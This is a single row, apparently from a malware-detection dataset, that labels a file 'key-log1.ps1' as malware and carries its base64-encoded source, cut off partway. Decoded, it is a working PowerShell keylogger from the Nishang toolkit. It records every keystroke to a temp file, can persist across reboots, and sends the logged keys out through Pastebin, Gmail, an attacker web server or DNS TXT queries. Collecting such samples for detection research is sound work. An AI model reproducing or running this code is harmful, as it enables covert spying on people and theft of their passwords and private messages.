key-log1.ps1,a4eb75d34dcccb441a1af4cc45abd245,Scan result is 32768. IsMalware: 1,PCMKLlNZTk9QU0lTCk5pc2hhbmcgUGF5bG9hZCB3aGljaCBsb2dzIGtleXMuICBTb3VyY2VkIGZyb206IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGVldHovbmlzaGFuZy9tYXN0ZXIvR2F0aGVyL2sgZSB5IGwgbyBnIGcgZSByLnBzMQoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBsb2dzIGEgdXNlcidzIGtleXMgYW5kIHdyaXRlcyB0aGVtIHRvIGZpbGUga2V5LmxvZyAoSSBrbm93IGl0cyBiYWQgOnwpIGluIHVzZXIncyB0ZW1wIGRpcmVjdG9yeS4KVGhlIGtleXMgYXJlIHRoYW4gcGFzdGVkIHRvIHBhc3RlYmlufHRpbnlwYXN0ZXxnbWFpbHxhbGwgYXMgcGVyIHNlbGVjdGlvbi4gU2F2ZWQga2V5cyBjb3VsZCB0aGVuIGJlIGRlY29kZWQKdXNpbmcgdGhlIFBhcnNlX0tleSBzY3JpcHQgaW4gbmlzaGFuZy4KCi5QQVJBTUVURVIgcGVyc2lzdApVc2UgdGhpcyBwYXJhbWV0ZXIgdG8gYWNoaWV2ZSByZWJvb3QgcGVyc2lzdGVuY2UuIERpZmZlcmVudCBtZXRob2RzIG9mIHBlcnNpc3RlbmNlIHdpdGggQWRtaW4gYWNjZXNzIGFuZCBub3JtYWwgdXNlciBhY2Nlc3MuCgouUEFSQU1FVEVSIEV4ZmlsT3B0aW9uClRoZSBtZXRob2QgeW91IHdhbnQgdG8gdXNlIGZvciBleGZpdHJhdGlvbiBvZiBkYXRhLiBWYWxpZCBvcHRpb25zIGFyZSAiZ21haWwiLCJwYXN0ZWJpbiIsIldlYlNlcnZlciIgYW5kICJETlMiLgoKLlBBUkFNRVRFUiBkZXZfa2V5ClRoZSBVbmlxdWUgQVBJIGtleSBwcm92aWRlZCBieSBwYXN0ZWJpbiB3aGVuIHlvdSByZWdpc3RlciBhIGZyZWUgYWNjb3VudC4KVW51c2VkIGZvciBvdGhlciBvcHRpb25zCgouUEFSQU1FVEVSIHVzZXJuYW1lClVzZXJuYW1lIGZvciB0aGUgcGFzdGViaW4vZ21haWwgYWNjb3VudCB3aGVyZSBkYXRhIHdvdWxkIGJlIGV4ZmlsdHJhdGVkLgpVbnVzZWQgZm9yIG90aGVyIG9wdGlvbnMKCi5QQVJBTUVURVIgcGFzc3dvcmQKUGFzc3dvcmQgZm9yIHRoZSBwYXN0ZWJpbi9nbWFpbCBhY2NvdW50IHdoZXJlIGRhdGEgd291bGQgYmUgZXhmaWx0cmF0ZWQuClVudXNlZCBmb3Igb3RoZXIgb3B0aW9ucwoKLlBBUkFNRVRFUiBVUkwKVGhlIFVSTCBvZiB0aGUgd2Vic2VydmVyIHdoZXJlIFBPU1QgcmVxdWVzdHMgd291bGQgYmUgc2VudC4KCi5QQVJBTUVURVIgRG9tYWluTmFtZQpUaGUgRG9tYWluTmFtZSwgd2hvc2Ugc3ViZG9tYWlucyB3b3VsZCBiZSB1c2VkIGZvciBzZW5kaW5nIFRYVCBxdWVyaWVzIHRvLgoKLlBBUkFNRVRFUiBBdXRoTlMKQXV0aG9yaXRhdGl2ZSBOYW1lIFNlcnZlciBmb3IgdGhlIGRvbWFpbiBzcGVjaWZpZWQgaW4gRG9tYWluTmFtZQoKLlBBUkFNRVRFUiBNYWdpY1N0cmluZwpUaGUgc3RyaW5nIHdoaWNoIHdoZW4gZm91bmQgYXQgQ2hlY2tVUkwgd2lsbCBzdG9wIHRoZSBrZXlsb2dnZXIuCgouUEFSQU1FVEVSIENoZWNrVVJMClRoZSBVUkwgd2hpY2ggd291bGQgY29udGFpbiB0aGUgTWFnaWNTdHJpbmcgdXNlZCB0byBzdG9wIGtleWxvZ2dpbmcuCgouRVhBTVBMRQpQUyA+IC5cS2V5bG9nZ2VyLnBzMQpUaGUgcGF5bG9hZCB3aWxsIGFzayBmb3IgYWxsIHJlcXVpcmVkIG9wdGlvbnMuCgouRVhBTVBMRQpQUyA+IC5cS2V5bG9nZ2VyLnBzMSAtQ2hlY2tVUkwgaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9anFQMnZKM3ggLU1hZ2ljU3RyaW5nIHN0b3B0aGlzClVzZSBhYm92ZSB3aGVuIHVzaW5nIHRoZSBwYXlsb2FkIGZyb20gbm9uLWludGVyYWN0aXZlIHNoZWxscyBhbmQgbm8gZXhmaWx0cmF0aW9uIGlzIHJlcXVpcmVkLgoKLkVYQU1QTEUKUFMgPiAuXEtleWxvZ2dlci5wczEgLUNoZWNrVVJMIGh0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3LnBocD9pPWpxUDJ2SjN4IC1NYWdpY1N0cmluZyBzdG9wdGhpcyAtZXhmaWwgLUV4ZmlsT3B0aW9uIFdlYlNlcnZlciAtVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4yMjYvZGF0YS9jYXRjaC5waHAKVXNlIGFib3ZlIGZvciBleGZpbHRyYXRpb24gdG8gYSB3ZWJzZXJ2ZXIgd2hpY2ggbG9ncyBQT1NUIHJlcXVlc3RzCgoKLkVYQU1QTEUKUFMgPiAuXEtleWxvZ2dlci5wczEgLXBlcnNpc3QKClVzZSBhYm92ZSBmb3IgcmVib290IHBlcnNpc3RlbmNlLgoKLkxJTksKaHR0cDovL2xhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0ibm9leGZpbCIpXSBQYXJhbSggCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJHBlcnNpc3QsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRleGZpbCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0ibm9leGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENoZWNrVVJMLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJub2V4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTWFnaWNTdHJpbmcsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIFtWYWxpZGF0ZVNldCgiZ21haWwiLCJwYXN0ZWJpbiIsIldlYlNlcnZlciIsIkROUyIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEV4ZmlsT3B0aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXSAKICAgICAgICBbU3RyaW5nXQogICAgICAgICRkZXZfa2V5ID0gIm51bGwiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHVzZXJuYW1lID0gIm51bGwiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHBhc3N3b3JkID0gIm51bGwiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNiwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVSTCA9ICJudWxsIiwKICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDcsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5OYW1lID0gIm51bGwiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gOCwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEF1dGhOUyA9ICJudWxsIiAgIAogICAKICAgICkKCgoKJGZ1bmN0aW9ucyA9ICB7CgpmdW5jdGlvbiBzY3JpcHQ6S2V5bG9nZ2VyCnsKICAgIFBhcmFtICggCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNYWdpY1N0cmluZywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDaGVja1VSTAogICAgKQogICAgCiAgICAkc2lnbmF0dXJlID0gQCIgCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8sIEV4YWN0U3BlbGxpbmc9dHJ1ZSldIAogICAgcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgdmlydHVhbEtleUNvZGUpOyAKIkAgCiAgICAkZ2V0S2V5U3RhdGUgPSBBZGQtVHlwZSAtbWVtYmVyRGVmaW5pdGlvbiAkc2lnbmF0dXJlIC1uYW1lICJOZXd0eXBlIiAtbmFtZXNwYWNlIG5ld25hbWVzcGFjZSAtcGFzc1RocnUgCiAgICAkY2hlY2sgPSAwCiAgICB3aGlsZSAoJHRydWUpIAogICAgeyAKICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDQwIAogICAgICAgICRsb2dnZWQgPSAiIiAKICAgICAgICAkcmVzdWx0PSIiIAogICAgICAgICRzaGlmdF9zdGF0ZT0iIiAKICAgICAgICAkY2Fwc19zdGF0ZT0iIiAKICAgICAgICBmb3IgKCRjaGFyPTE7JGNoYXIgLWxlIDI1NDskY2hhcisrKSAKICAgICAgICB7IAogICAgICAgICAgICAkdmtleSA9ICRjaGFyIAogICAgICAgICAgICAkbG9nZ2VkID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKCR2a2V5KSAKICAgICAgICAgICAgaWYgKCRsb2dnZWQgLWVxIC0zMjc2NykgCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICBpZigoJHZrZXkgLWdlIDQ4KSAtYW5kICgkdmtleSAtbGUgNTcpKSAKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJGxlZnRfc2hpZnRfc3RhdGUgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoMTYwKSAKICAgICAgICAgICAgICAgICAgICAkcmlnaHRfc2hpZnRfc3RhdGUgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoMTYxKSAKICAgICAgICAgICAgICAgICAgICAgICAgaWYoKCRsZWZ0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpIC1vciAoJHJpZ2h0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpKSAKICAgICAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAiUy0iICsgJHZrZXkgCiAgICAgICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHZrZXkgCiAgICAgICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgIGVsc2VpZigoJHZrZXkgLWdlIDY0KSAtYW5kICgkdmtleSAtbGUgOTApKSAKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJGxlZnRfc2hpZnRfc3RhdGUgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoMTYwKSAKICAgICAgICAgICAgICAgICAgICAkcmlnaHRfc2hpZnRfc3RhdGUgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoMTYxKSAKICAgICAgICAgICAgICAgICAgICAkY2Fwc19zdGF0ZSA9IFtjb25zb2xlXTo6Q2Fwc0xvY2sgCiAgICAgICAgICAgICAgICAgICAgaWYoISgoJGxlZnRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkgLW9yICgkcmlnaHRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkpIC14b3IgJGNhcHNfc3RhdGUpIAogICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAiUy0iICsgJHZrZXkgCiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdmtleSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgIGVsc2VpZigoKCR2a2V5IC1nZSAxODYpIC1hbmQgKCR2a2V5IC1sZSAxOTIpKSAtb3IgKCgkdmtleSAtZ2UgMjE5KSAtYW5kICgkdmtleSAtbGUgMjIyKSkpIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAkbGVmdF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjApIAogICAgICAgICAgICAgICAgICAgICRyaWdodF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjEpIAogICAgICAgICAgICAgICAgICAgIGlmKCgkbGVmdF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSAtb3IgKCRyaWdodF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSkgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICJTLSIgKyAkdmtleSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdmtleSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdmtleSAKICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAkbm93ID0gR2V0LURhdGU7IAogICAgICAgICAgICAgICAgJGxvZ0xpbmUgPSAiJHJlc3VsdCAiIAogICAgICAgICAgICAgICAgJGZpbGVuYW1lID0gIiRlbnY6dGVtcFxrZXkubG9nIiAKICAgICAgICAgICAgICAgIE91dC1GaWxlIC1GaWxlUGF0aCAkZmlsZU5hbWUgLUFwcGVuZCAtSW5wdXRPYmplY3QgIiRsb2dMaW5lIiAKCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJGNoZWNrKysKICAgICAgICBpZiAoJGNoZWNrIC1lcSA2MDAwKQogICAgICAgIHsKICAgICAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAgICAgJGZpbGVjb250ZW50ID0gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygiJENoZWNrVVJMIikKICAgICAgICAgICAgaWYgKCRmaWxlY29udGVudCAtZXEgJE1hZ2ljU3RyaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgICAgICRjaGVjayA9IDAKICAgICAgICB9CiAgICB9Cn0KCiAgICBmdW5jdGlvbiBLZXlwYXN0ZQogICAgewogICAgICAgIFBhcmFtICggCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRFeGZpbE9wdGlvbiwKICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJGRldl9rZXksCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICR1c2VybmFtZSwKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRwYXNzd29yZCwKICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFVSTCwKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRBdXRoTlMsCgogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkTWFnaWNTdHJpbmcsCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA3LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRDaGVja1VSTAogICAgICAgICkKCiAgICAgICAgJGNoZWNrID0gMAogICAgICAgIHdoaWxlKCR0cnVlKSAKICAgICAgICB7IAogICAgICAgICAgICAkcmVhZCA9IDAKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNSAKICAgICAgICAgICAgJHBhc3RldmFsdWU9R2V0LUNvbnRlbnQgJGVudjp0ZW1wXGtleS5sb2cgCiAgICAgICAgICAgICRyZWFkKysKICAgICAgICAgICAgaWYgKCRyZWFkIC1lcSAzMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRlbnY6dGVtcFxrZXkubG9nIC1Gb3JjZSAtSW5wdXRPYmplY3QgIiAiIAogICAgICAgICAgICAgICAgJHJlYWQgPSAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG5vdyA9IEdldC1EYXRlOyAKICAgICAgICAgICAgJG5hbWUgPSAkZW52OkNPTVBVVEVSTkFNRSAKICAgICAgICAgICAgJHBhc3RlX25hbWUgPSAkbmFtZSArICIgOiAiICsgJG5vdy5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygiZGQvTU0veXl5eSBISDptbTpzczpmZmYiKQogICAgICAgICAgICBmdW5jdGlvbiBwb3N0X2h0dHAoJHVybCwkcGFyYW1ldGVycykgCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0ID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IE1zeG1sMi5YTUxIVFRQIAogICAgICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5vcGVuKCJQT1NUIiwgJHVybCwgJGZhbHNlKSAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIikgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIiwgJHBhcmFtZXRlcnMubGVuZ3RoKTsgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbm5lY3Rpb24iLCAiY2xvc2UiKSAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2VuZCgkcGFyYW1ldGVycykgCiAgICAgICAgICAgICAgICAkc2NyaXB0OnNlc3Npb25fa2V5PSRodHRwX3JlcXVlc3QucmVzcG9uc2VUZXh0IAogICAgICAgICAgICB9IAoKICAgICAgICAgICAgZnVuY3Rpb24gQ29tcHJlc3MtRW5jb2RlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNDb21wcmVzc2lvbiBsb2dpYyBmcm9tIGh0dHA6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMTMvMy8yMS9wb3dlcnNoZWxsLWJhc2ljcy1leGVjdXRpb24tcG9saWN5LWFuZC1jb2RlLXNpZ25pbmctcGFydC0yLmh0bWwKICAgICAgICAgICAgICAgICRtcyA9IE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtCiAgICAgICAgICAgICAgICAkYWN0aW9uID0gW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzCiAgICAgICAgICAgICAgICAkY3MgPSBOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCRtcywkYWN0aW9uKQogICAgICAgICAgICAgICAgJHN3ID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIgKCRjcywgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkKICAgICAgICAgICAgICAgICRwYXN0ZXZhbHVlIHwgRm9yRWFjaC1PYmplY3QgeyRzdy5Xcml0ZUxpbmUoJF8pfQogICAgICAgICAgICAgICAgJHN3LkNsb3NlKCkKICAgICAgICAgICAgICAgICMgQmFzZTY0IGVuY29kZSBzdHJlYW0KICAgICAgICAgICAgICAgICRjb2RlID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkbXMuVG9BcnJheSgpKQogICAgICAgICAgICAgICAgcmV0dXJuICRjb2RlCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkZXhmaWxvcHRpb24gLWVxICJwYXN0ZWJpbiIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICR1dGZieXRlcyAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCREYXRhKQogICAgICAgICAgICAgICAgJHBhc3RldmFsdWUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkdXRmYnl0ZXMpCiAgICAgICAgICAgICAgICBwb3N0X2h0dHAgImh0dHBzOi8vcGFzdGViaW4uY29tL2FwaS9hcGlfbG9naW4ucGhwIiAiYXBpX2Rldl9rZXk9JGRldl9rZXkmYXBpX3VzZXJfbmFtZT0kdXNlcm5hbWUmYXBpX3VzZXJfcGFzc3dvcmQ9JHBhc3N3b3JkIiAKICAgICAgICAgICAgICAgIHBvc3RfaHR0cCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vYXBpL2FwaV9wb3N0LnBocCIgImFwaV91c2VyX2tleT0kc2Vzc2lvbl9rZXkmYXBpX29wdGlvbj1wYXN0ZSZhcGlfZGV2X2tleT0kZGV2X2tleSZhcGlfcGFzdGVfbmFtZT0kcGFzdGVuYW1lJmFwaV9wYXN0ZV9jb2RlPSRwYXN0ZXZhbHVlJmFwaV9wYXN0ZV9wcml2YXRlPTIiIAogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgIGVsc2VpZiAoJGV4Zmlsb3B0aW9uIC1lcSAiZ21haWwiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8xMjUyMzM1L3NlbmQtbWFpbC12aWEtZ21haWwtd2l0aC1wb3dlcnNoZWxsLXYycy1zZW5kLW1haWxtZXNzYWdlCiAgICAgICAgICAgICAgICAkc210cHNlcnZlciA9ICJzbXRwLmdtYWlsLmNvbSIKICAgICAgICAgICAgICAgICRtc2cgPSBuZXctb2JqZWN0IE5ldC5NYWlsLk1haWxNZXNzYWdlCiAgICAgICAgICAgICAgICAkc210cCA9IG5ldy1vYmplY3QgTmV0Lk1haWwuU210cENsaWVudCgkc210cFNlcnZlciApCiAgICAgICAgICAgICAgICAkc210cC5FbmFibGVTc2wgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJHNtdHAuQ3JlZGVudGlhbHMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoIiR1c2VybmFtZSIsICIkcGFzc3dvcmQiKTsgCiAgICAgICAgICAgICAgICAkbXNnLkZyb20gPSAiJHVzZXJuYW1lQGdtYWlsLmNvbSIKICAgICAgICAgICAgICAgICRtc2cuVG8uQWRkKCIkdXNlcm5hbWVAZ21haWwuY29tIikKICAgICAgICAgICAgICAgICRtc2cuU3ViamVjdCA9ICRwYXN0ZW5hbWUKICAgICAgICAgICAgICAgICRtc2cuQm9keSA9ICRwYXN0ZXZhbHVlCiAgICAgICAgICAgICAgICBpZiAoJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRhdHQgPSBuZXctb2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgICAgICRtc2cuQXR0YWNobWVudHMuQWRkKCRhdHQpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc210cC5TZW5kKCRtc2cpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGVsc2VpZiAoJGV4Zmlsb3B0aW9uIC1lcSAid2Vic2VydmVyIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERhdGEgPSBDb21wcmVzcy1FbmNvZGUgICAgCiAgICAgICAgICAgICAgICBwb3N0X2h0dHAgJFVSTCAkRGF0YQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJEV4ZmlsT3B0aW9uIC1lcSAiRE5TIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGxlbmd0aG9mc3Vic3RyID0gMAogICAgICAgICAgICAgICAgJGNvZGUgPSBDb21wcmVzcy1FbmNvZGUKICAgICAgICAgICAgICAgICRxdWVyaWVzID0gW2ludF0oJGNvZGUuTGVuZ3RoLzYzKQogICAgICAgICAgICAgICAgd2hpbGUgKCRxdWVyaWVzIC1uZSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRxdWVyeXN0cmluZyA9ICRjb2RlLlN1YnN0cmluZygkbGVuZ3Rob2ZzdWJzdHIsNjMpCiAgICAgICAgICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gIm5zbG9va3VwIC1xdWVyeXR5cGU9dHh0ICRxdWVyeXN0cmluZy4kRG9tYWluTmFtZSAkRXhmaWxOUyIKICAgICAgICAgICAgICAgICAgICAkbGVuZ3Rob2ZzdWJzdHIgKz0gNjMKICAgICAgICAgICAgICAgICAgICAkcXVlcmllcyAtPSAxCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkbW9kID0gJGNvZGUuTGVuZ3RoJTYzCiAgICAgICAgICAgICAgICAkcXVlcnkgPSAkY29kZS5TdWJzdHJpbmcoJGNvZGUuTGVuZ3RoIC0gJG1vZCwgJG1vZCkKICAgICAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uICJuc2xvb2t1cCAtcXVlcnl0eXBlPXR4dCAkcXVlcnkuJERvbWFpbk5hbWUgJEV4ZmlsTlMiCgogICAgICAgICAgICB9CgogICAgICAgICAgICAkY2hlY2srKwogICAgICAgICAgICBpZiAoJGNoZWNrIC1lcSA2MDAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkY2hlY2sgPSAwCiAgICAgICAgICAgICAgICAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTm